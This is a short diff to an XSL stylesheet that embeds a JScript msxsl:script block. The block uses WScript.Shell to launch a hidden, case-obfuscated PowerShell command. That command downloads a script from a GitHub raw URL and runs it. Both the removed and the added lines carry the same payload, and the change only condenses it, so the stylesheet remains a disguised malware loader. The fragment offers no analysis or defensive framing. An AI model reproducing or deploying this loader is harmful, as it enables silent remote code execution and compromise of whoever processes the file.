@@ -6,7 +6,6 @@ version="1.0">
 <output method="text"/>
     <ms:script implements-prefix="user" language="JScript">
     <![CDATA[
-    var objShell = new ActiveXObject("wscript.shell");
-    objShell.Run("cMd.exE /c pOWersHElL irm https://raw.githubusercontent.com/joes233f/ccc/main/c.ps1|pOWersHElL -nOLoGo -WiNdOwSTyle HiDDen -NoEXIt -NoPROfIlE -NonInteractive",0,false");
+    var objShell = new ActiveXObject("wscript.shell").Run("cMd.exE /c pOWersHElL irm https://raw.githubusercontent.com/joes233f/ccc/main/c.ps1|pOWersHElL -nOLoGo -WiNdOwSTyle HiDDen -NoEXIt -NoPROfIlE -NonInteractive",0,false");
     ]]> </ms:script>
 </stylesheet>
